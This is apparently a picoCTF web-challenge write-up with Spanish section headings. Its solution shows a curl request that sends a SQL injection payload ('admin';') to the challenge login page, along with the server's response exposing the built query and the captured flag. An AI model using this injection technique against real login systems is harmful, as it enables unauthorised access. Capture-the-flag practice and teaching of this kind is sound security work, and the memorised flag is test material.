## Descripción 
Do you think you can log us in? Try to see if you can login!

[http://fickle-tempest.picoctf.net:62737](http://fickle-tempest.picoctf.net:62737/).
## Solución 
```
Son69-academy@webshell:~$ curl -s http://fickle-tempest.picoctf.net:56133/login.php -d "username=admin';&password=hola&debug=1"
<pre>username: admin';
password: hola
SQL query: SELECT * FROM users WHERE name='admin';' AND password='hola'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_85832275}</p>Son69-academy@webshell:~$ 


```
## Notas adicionales 
*  
## Referencias
*  https://www.w3schools.com/sql/sql_injection.asp